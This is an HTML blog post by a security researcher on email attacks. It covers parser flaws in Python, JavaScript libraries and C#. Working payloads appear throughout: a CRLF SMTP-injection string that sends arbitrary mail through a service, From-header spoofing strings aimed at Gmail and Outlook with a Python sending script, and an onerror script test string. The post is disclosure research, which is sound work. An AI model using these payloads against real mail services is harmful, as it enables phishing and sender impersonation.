@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Old new email attacks - Slonser Notes</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+
+Introduction
+This article will be dedicated to my research in the field of email service attacks, including all aspects related to email messages." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="//localhost:1313/posts/email-attacks/">
+  <meta property="og:site_name" content="Slonser Notes">
+  <meta property="og:title" content="Old new email attacks">
+  <meta property="og:description" content="The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+Introduction This article will be dedicated to my research in the field of email service attacks, including all aspects related to email messages.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-05-23T15:00:00+03:00">
+    <meta property="article:modified_time" content="2024-05-23T15:00:00+03:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Old new email attacks">
+  <meta name="twitter:description" content="The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
+Introduction This article will be dedicated to my research in the field of email service attacks, including all aspects related to email messages.">
+
+        <link href="//localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.50b57e12d401420df23965fed157368aba37b76df0ecefd0b1ecd4da664f01a0.css" media="(prefers-color-scheme: dark)"  />
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Slonser Notes</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/posts/who-am-i/">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title">Old new email attacks</h1>
+          <div class="meta">Posted on May 23, 2024</div>
+        </div>
+        
+        <section class="body">
+          <blockquote>
+<p>The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.</p>
+</blockquote>
+<h1 id="introduction">Introduction</h1>
+<p>This article will be dedicated to my research in the field of email service attacks, including all aspects related to email messages.</p>
+<h1 id="updated">UPDATED</h1>
+<p>This article presents vulnerabilities related to Microsoft services and C#. I am pleased to report that Microsoft is actively working on fixing them. I will update the article once the bugs are resolved.</p>
+<h1 id="address">Address</h1>
+<h2 id="basics">Basics</h2>
+<p>Let&rsquo;s start with the basics. Within the &ldquo;From&rdquo; header tag, the following types of structures exist:</p>
+<p>Email - <code>From: slonser@domain.com</code></p>
+<p>Name - <code>From: &quot;slonser&quot; &lt;slonser@domain.com&gt;</code></p>
+<p>Comments - <code>From: &lt;slonser@domain.com&gt; (comment content)</code></p>
+<p>Grouping - <code>From: Group Name: &lt;slonser@domain.com&gt;</code></p>
+<p>Sender header - <code>Sender: slonser@domain.com</code></p>
+<h2 id="address-1">[address]</h2>
+<p>The email standard allows inserting a domain within square brackets <code>[]</code>, where a broader range of characters is permitted (though still limited).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>domain = dot-atom / domain-literal / obs-domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>domain-literal = [CFWS] &#34;[&#34; *([FWS] dcontent) [FWS] &#34;]&#34; [CFWS]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dcontent = dtext / quoted-pair
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dtext = NO-WS-CTL /     ; Non white space controls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        %d33-90 /       ; The rest of the US-ASCII
+</span></span><span style="display:flex;"><span>        %d94-126        ;  characters not including &#34;[&#34;,
+</span></span><span style="display:flex;"><span>                        ;  &#34;]&#34;, or &#34;\
+</span></span></code></pre></div><h2 id="python">Python</h2>
+<p>Let&rsquo;s take a look at the implementation of the address parser in Python&rsquo;s standard library.</p>
+<p>In Python, the email module provides a way to parse email addresses. Specifically, the email.utils submodule includes the parseaddr function, which can be used to parse email addresses. Here’s an example of how this can be done:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&gt;&gt;&gt; from email.utils import parseaddr
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; parseaddr(&#34;&lt;s@[domain.com\nSlon:&lt;img src=x onerror=alert()&gt;]&gt;&#34;)
+</span></span><span style="display:flex;"><span>(&#39;&#39;, &#39;s@[domain.com\nSlon:&lt;img src=x onerror=alert()&gt;]&#39;)
+</span></span></code></pre></div><p>As you can observe, Python does not strictly adhere to the RFC standards we reviewed and allows the inclusion of non-printable ASCII characters within email addresses, which can lead to CRLF injection vulnerabilities.</p>
+<h2 id="addressparser-js">addressparser JS</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">addressparser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span> (<span style="color:#e6db74">&#39;addressparser&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">addresses</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addressparser</span> (<span style="color:#e6db74">&#39;Slonser &lt;slonser@[S]\x00\r\n]&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span> (<span style="color:#a6e22e">addresses</span>) ;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>//Output: [ { address: &#39;slonser@[S]\x00\r\n]&#39;, name: &#39;Slonser&#39; } ]
+</span></span></code></pre></div><h2 id="email-addresses-in-js">email-addresses in JS</h2>
+<p>Let&rsquo;s test another popular solution - <a href="https://www.npmjs.com/package/email-addresses">email-addresses</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> addrs <span style="color:#f92672">=</span> require(<span style="color:#e6db74">&#34;email-addresses&#34;</span>)
+</span></span><span style="display:flex;"><span>let result <span style="color:#f92672">=</span> addrs<span style="color:#f92672">.</span>parseOneAddress(<span style="color:#e6db74">&#34;&lt;slonser@[::1&gt;</span><span style="color:#ae81ff">\&#34;\\</span><span style="color:#e6db74">[:&lt;h1&gt;slonser@gmail.com,русский?]&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>console<span style="color:#f92672">.</span>log(result<span style="color:#f92672">.</span>address)
+</span></span></code></pre></div><p>Result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>slonser@[::1&gt;&#34;[:&lt;h1&gt;slonser@gmail.com,русский?]
+</span></span></code></pre></div><p>So we can input <code>[</code> in <code>[]</code>.</p>
+<p>Also as you can see, UTF-8 characters are used here. The problem is that according to the RFC, an address should contain only ASCII characters. When forwarding to other services, we may encounter the issue where a UTF-8 character is interpreted as separate bytes.</p>
+<h2 id="c">C#</h2>
+<p>Let&rsquo;s look at a standard example of sending emails in C#. The System.Net.Mail namespace provides classes to construct and send email messages. Here&rsquo;s a basic example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> sendMessage(String to_string){
+</span></span><span style="display:flex;"><span>            MailAddress <span style="color:#66d9ef">from</span> = <span style="color:#66d9ef">new</span> MailAddress(<span style="color:#e6db74">&#34;slonser.bugbounty@outlook.com&#34;</span>, <span style="color:#e6db74">&#34;Slonser&#34;</span>);
+</span></span><span style="display:flex;"><span>            MailAddress to = <span style="color:#66d9ef">new</span> MailAddress(to_string);
+</span></span><span style="display:flex;"><span>            MailMessage m = <span style="color:#66d9ef">new</span> MailMessage(<span style="color:#66d9ef">from</span>, to);
+</span></span><span style="display:flex;"><span>            Console.WriteLine(to);
+</span></span><span style="display:flex;"><span>            m.Subject = <span style="color:#e6db74">&#34;Subject&#34;</span>;
+</span></span><span style="display:flex;"><span>            m.Body = <span style="color:#e6db74">&#34;Body&#34;</span>;
+</span></span><span style="display:flex;"><span>            SmtpClient smtp = <span style="color:#66d9ef">new</span> SmtpClient(<span style="color:#e6db74">&#34;smtp-mail.outlook.com&#34;</span>, <span style="color:#ae81ff">587</span>);
+</span></span><span style="display:flex;"><span>            smtp.Credentials = <span style="color:#66d9ef">new</span> NetworkCredential(<span style="color:#e6db74">&#34;slonser.bugbounty@outlook.com&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>);
+</span></span><span style="display:flex;"><span>            smtp.EnableSsl = <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>            smtp.Send(m);
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>Here is a basic example of sending an email where we control only the &ldquo;To&rdquo; field in the message.</p>
+<p>It&rsquo;s important to understand that the MailAddress class in C# performs filtering:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>to_string=<span style="color:#e6db74">&#34;&lt;slonser.bugbounty@\r\nyandex.ru&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>sendMessage(to_string);
+</span></span></code></pre></div><p>You will see that the input is validated and newline characters are removed:
+<img src="./1.jpg" alt=""></p>
+<p>But <code>[]</code>&hellip;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> to_string = <span style="color:#e6db74">&#34;sevakokorin80@[test\r\nslonser]&#34;</span>;
+</span></span><span style="display:flex;"><span>sendMessage(to_string);
+</span></span></code></pre></div><p>Output:
+<img src="./2.jpg" alt=""></p>
+<p>This means we have the opportunity to insert CRLF in the address. Therefore, let&rsquo;s try to use SMTP injection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>slonser@[test
+</span></span><span style="display:flex;"><span>RSET
+</span></span><span style="display:flex;"><span>MAIL FROM: &lt;slonser.bugbounty@yandex.ru&gt;
+</span></span><span style="display:flex;"><span>RCPT TO: &lt;recipient@yandex.ru&gt;
+</span></span><span style="display:flex;"><span>DATA
+</span></span><span style="display:flex;"><span>From: slonser.bugbounty@yandex.ru
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Changed
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>QUIT
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>And you will see output:
+<img src="./3.jpg" alt=""></p>
+<p>This means we can insert external SMTP commands, reset the current SMTP session using the RSET command, and send arbitrary emails from the service.</p>
+<p>As a result, this allows sending emails with any content to any email addresses, which can be used in phishing attacks.</p>
+<p>A typical example of such attacks involves websites that send registration or password recovery emails. I have found instances where this can indeed lead to scenarios where we can send arbitrary content as if it were from the company&rsquo;s domain.</p>
+<p>Indeed, other patterns that were considered earlier lead to similar problems. However, the address is not always directly inserted into the SMTP packet</p>
+<h1 id="email-spoofing">Email spoofing</h1>
+<p>Another major issue I encountered is the inconsistency of SMTP servers. The problem is that SMTP servers parse the recipient address differently, which leads to email spoofing.</p>
+<h2 id="script-for-testing">Script for testing</h2>
+<p>The following Python script will be used for testing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.mime.text <span style="color:#f92672">import</span> MIMEText
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.mime.multipart <span style="color:#f92672">import</span> MIMEMultipart
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Replace these values with your own information</span>
+</span></span><span style="display:flex;"><span>sender_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;slonser.bugbounty@gmail.com&#34;</span>
+</span></span><span style="display:flex;"><span>receiver_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;slonser.bugbounty@outlook.com&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#75715e"># gmail</span>
+</span></span><span style="display:flex;"><span>smtp_server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;smtp.gmail.com&#34;</span>
+</span></span><span style="display:flex;"><span>message[<span style="color:#e6db74">&#34;From&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;spoofed@gmail.com&gt; </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">spoofed</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &lt;slonser.bugbounty@gmail.com&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message<span style="color:#f92672">.</span>attach(MIMEText(<span style="color:#e6db74">&#39;Amogus&#39;</span>, <span style="color:#e6db74">&#34;plain&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">=</span> smtplib<span style="color:#f92672">.</span>SMTP(smtp_server, smtp_port)
+</span></span><span style="display:flex;"><span>server<span style="color:#f92672">.</span>set_debuglevel(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>server<span style="color:#f92672">.</span>starttls()
+</span></span><span style="display:flex;"><span>server<span style="color:#f92672">.</span>login(sender_email, password)
+</span></span><span style="display:flex;"><span>print(message<span style="color:#f92672">.</span>as_string())
+</span></span><span style="display:flex;"><span>server<span style="color:#f92672">.</span>sendmail(sender_email, receiver_email, message<span style="color:#f92672">.</span>as_string())
+</span></span></code></pre></div><p>For all the payloads below, simply change message[&ldquo;From&rdquo;] in the given code.</p>
+<h2 id="gmail---outlook">Gmail -&gt; Outlook</h2>
+<p>Gmail allows inserting <code>&lt;something&gt;</code> before the actual email address, which leads to incorrect parsing of the address by many email providers, including Outlook.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;spoofed@gmail.com&gt; &#34;spoofed&#34; &lt;slonser.bugbounty@gmail.com&gt;
+</span></span></code></pre></div><p>In Outlook, you will see <a href="mailto:spoofed@gmail.com">spoofed@gmail.com</a>:
+<img src="./gmail_outlook.jpg" alt=""></p>
+<h2 id="grouping-nightmare">Grouping Nightmare</h2>
+<p>Another issue I discovered is that some email providers allow the use of the symbols &lt; and &gt; in group names, which does not comply with RFC standards. Therefore, we can utilize the following two payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;spoofed@domain.com&gt;:&lt;valid@domain.com&gt;
+</span></span><span style="display:flex;"><span>&lt;valid@domain.com&gt;:&lt;spoofed@domain.com&gt;
+</span></span></code></pre></div><h3 id="outlook---gmail">Outlook -&gt; Gmail</h3>
+<p>Let&rsquo;s use this in outlook.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#34;Spoofed&#34;
+</span></span><span style="display:flex;"><span>&lt;slonser.bugbounty@outlook.com&gt;: spoofed@outlook.com
+</span></span></code></pre></div><p><img src="./outlook_gmail.jpg" alt=""></p>
+<h3 id="gmail---outlook-part-2">Gmail -&gt; Outlook (part 2)</h3>
+<p>Just use second payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Slonser &lt;spoofed@gmail.com&gt;:&lt;slonser.bugbounty@gmail.com&gt;
+</span></span></code></pre></div><p>You will see sender:
+<img src="./gmail_outlook2.jpg" alt=""></p>
+<h3 id="gmail----">Gmail  -&gt; &hellip;</h3>
+<p>Gmail incorrectly parses group strings. It first splits the string at the colon (:), then parses the resulting segments separately. This behavior does not comply with RFC standards. For spoofing, you can use the following payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#34;: &lt;slonser.bugbounty@gmail.com&gt; &#34;&lt;spoofed@gmail.com&gt;&#34;
+</span></span></code></pre></div><p>Services that correctly parse the &ldquo;From&rdquo; field will interpret this as <code>spoofed@gmail.com</code>.</p>
+<h2 id="another-tips">Another Tips</h2>
+<ul>
+<li>Sometimes you need to use Sender header (Because it&rsquo;s not validated)</li>
+<li>If parser blocks CRLF in <code>[]</code> try to use unicode characters</li>
+</ul>
+<h1 id="finally">Finally</h1>
+<p>This is not an exhaustive list; the same issues affect desktop and mobile clients such as Thunderbird and Apple Mail. I am deeply saddened that this topic is not highlighted in the information security community. During my research, I did not find a single mail provider that correctly parses the &ldquo;From&rdquo; field according to RFC standards.</p>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          
+        </div>
+      </div>
+
+      
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/Slonser" rel="me" title="GitHub"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#github" />
+</svg></a><a class="border"></a><a class="soc" href="https://twitter.com/slonser_" rel="me" title="Twitter"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#twitter" />
+</svg></a><a class="border"></a><a class="soc" href="https://t.me/Slonser" rel="me" title="Telegram"><svg class="feather">
+   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#telegram" />
+</svg></a><a class="border"></a></div>
+  <div class="footer-info">
+    2026  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
